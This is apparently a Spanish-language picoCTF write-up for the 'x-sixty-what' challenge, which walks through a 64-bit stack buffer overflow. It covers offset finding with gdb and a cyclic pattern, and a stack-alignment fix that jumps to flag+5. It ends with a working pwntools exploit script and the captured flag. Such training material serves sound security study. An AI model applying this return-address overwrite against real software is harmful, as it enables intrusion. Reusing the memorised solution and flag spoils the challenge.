# x-sixty-what
Reminder: local exploits may not always work the same way remotely due to differences between machines.

Overflow x64 code Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the `flag` function in this [program](https://artifacts.picoctf.net/c/194/vuln). [Download source](https://artifacts.picoctf.net/c/194/vuln.c). `nc saturn.picoctf.net 58755`

## Solucion

### Inicial
- examinamos el tipo de archivo
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/xsixty]
└─$ file vuln 
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3267ee5914133fcf5ee026a4aa2b201324f02089, for GNU/Linux 3.2.0, not stripped
```
 
- lo leemos con readelf y analizamos un poco su estructura (google: 101 elf files)
 https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/
- Encabezado
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/xsixty]
└─$ readelf vuln -h
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x401150
  Start of program headers:          64 (bytes into file)
  Start of section headers:          15144 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         13
  Size of section headers:           64 (bytes)
  Number of section headers:         31
  Section header string table index: 30
                                        
```




- generamos un patron para calcular el offest necesario para sobre escribir la direccion de retorno

```pyhton
>>> from pwn import *
>>> cyclic(300)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac'
```

- En x64 la direccion de retorno no puede ser sobre escrita dado que el tema de canonical address, asi que EIP nunca sera sobre escrito, pero si podemos calcular el offset con el contenido de $rsp

```bash
┌──(kali㉿kali)-[~/picoctf/pwning/xsixty]
└─$ gdb -q vuln 
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) r <<< $(echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac')
Starting program: /home/kali/picoctf/pwning/xsixty/vuln <<< $(echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac')
Welcome to 64-bit. Give me a string that gets you the flag: 

Program received signal SIGSEGV, Segmentation fault.
0x00000000004012d1 in vuln ()
(gdb) info registers 
rax            0x7fffffffdde0      140737488346592
rbx            0x401340            4199232
rcx            0x7ffff7f9a9a0      140737353722272
rdx            0x0                 0
rsi            0x4052a1            4215457
rdi            0x7ffff7f9d680      140737353733760
rbp            0x6161617261616171  0x6161617261616171
rsp            0x7fffffffde28      0x7fffffffde28
r8             0x7fffffffdde0      140737488346592
r9             0x7fffffffdde0      140737488346592
r10            0x63                99
r11            0x7fffffffdeec      140737488346860
r12            0x401150            4198736
r13            0x0                 0
r14            0x0                 0
r15            0x0                 0
rip            0x4012d1            0x4012d1 <vuln+31>
eflags         0x10206             [ PF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) x $rsp
0x7fffffffde28:	0x61616173
(gdb) 
```

- con el contendo de $rsp calculamos el offset 

```

>>> cyclic_find(0x61616173)
72
>>> 'A'*72
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' 
```

- requerimos la direccion de la funcion flag para saltar ahi

```bash
(gdb) info address flag
Symbol "flag" is at 0x401236 in a file compiled without debugging.
```

- la convertimos al reves con p64
```
>>> p64(0x401236)
b'6\x12@\x00\x00\x00\x00\x00'
```

- compleatamos el payload completo offset + flag addr, y local lo rompe
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/xsixty]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6\x12@\x00\x00\x00\x00\x00' | ./vuln                     
Welcome to 64-bit. Give me a string that gets you the flag: 
flag{dummie}
zsh: done                echo  | 
zsh: segmentation fault  ./vuln

```

- probamos remoto y por alguna razon (ya lo decian las pistas) no explota, se debe a las diferentes implementaciones entre SOs
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/xsixty]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6\x12@\x00\x00\x00\x00\x00' | nc saturn.picoctf.net 61500
Welcome to 64-bit. Give me a string that gets you the flag: 
```

- podemos buscar otra direccion dentro de flag (la pista lo sugiete)

```bash(gdb) disassemble flag
Dump of assembler code for function flag:
   0x0000000000401236 <+0>:	endbr64 
   0x000000000040123a <+4>:	push   rbp
     0x000000000040123b <+5>:	mov    rbp,rsp
   0x000000000040123e <+8>:	sub    rsp,0x50
   0x0000000000401242 <+12>:	lea    rsi,[rip+0xdbf]        # 0x402008
   0x0000000000401249 <+19>:	lea    rdi,[rip+0xdba]        # 0x40200a
   0x0000000000401250 <+26>:	call   0x401130 <fopen@plt>
   0x0000000000401255 <+31>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401259 <+35>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x000000000040125e <+40>:	jne    0x401289 <flag+83>
   0x0000000000401260 <+42>:	lea    rdx,[rip+0xdac]        # 0x402013
   0x0000000000401267 <+49>:	lea    rsi,[rip+0xdba]        # 0x402028
   0x000000000040126e <+56>:	lea    rdi,[rip+0xde8]        # 0x40205d
   0x0000000000401275 <+63>:	mov    eax,0x0
   0x000000000040127a <+68>:	call   0x4010e0 <printf@plt>
   0x000000000040127f <+73>:	mov    edi,0x0
   0x0000000000401284 <+78>:	call   0x401140 <exit@plt>
   0x0000000000401289 <+83>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040128d <+87>:	lea    rax,[rbp-0x50]
   0x0000000000401291 <+91>:	mov    esi,0x40
   0x0000000000401296 <+96>:	mov    rdi,rax
   0x0000000000401299 <+99>:	call   0x4010f0 <fgets@plt>
   0x000000000040129e <+104>:	lea    rax,[rbp-0x50]
   0x00000000004012a2 <+108>:	mov    rdi,rax
   0x00000000004012a5 <+111>:	mov    eax,0x0
   0x00000000004012aa <+116>:	call   0x4010e0 <printf@plt>
   0x00000000004012af <+121>:	nop
   0x00000000004012b0 <+122>:	leave  
   0x00000000004012b1 <+123>:	ret    
End of assembler dump.
(gdb) 
```

- se trata de buscar otra direccion dentro de las misma funcion despues del push (lo dice la pista), la segunda

```bash
>>> p64(0x000000000040123b)
b';\x12@\x00\x00\x00\x00\x00'

```

- y lanzarla al local y remoto para probar que funcione, convertido automatico o manual
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/xsixty]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;\x12@\x00\x00\x00\x00\x00' | nc saturn.picoctf.net 62653 
Welcome to 64-bit. Give me a string that gets you the flag: 
picoCTF{b1663r_15_b3773r_964d9987}                                                                                                                        
┌──(kali㉿kali)-[~/picoctf/pwning/xsixty]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x3b\x12\x40\x00\x00\x00\x00\x00' | nc saturn.picoctf.net 62653
Welcome to 64-bit. Give me a string that gets you the flag: 
picoCTF{b1663r_15_b3773r_964d9987} 
```

- Exploit
```python
from pwn import *

#p   = process('./vuln')
p = connect('saturn.picoctf.net',55774)
elf = ELF('./vuln', checksec=False)

# offeset antes de alcanzar la direccion de retorno
offset = 72
overflow = b'A' * offset 

# construir el payload con la direccion de flag y 5 adelante
payload = overflow + p64(elf.symbols['flag']+5)
log.info(str(payload))
line = p.recv()
log.info(str(line))
p.sendline(payload)

flag = p.recvall()

log.info(str(flag))

```



Referencias
- https://shakuganz.com/2022/03/30/picoctf-2022-write-up-binary-exploitation/
- 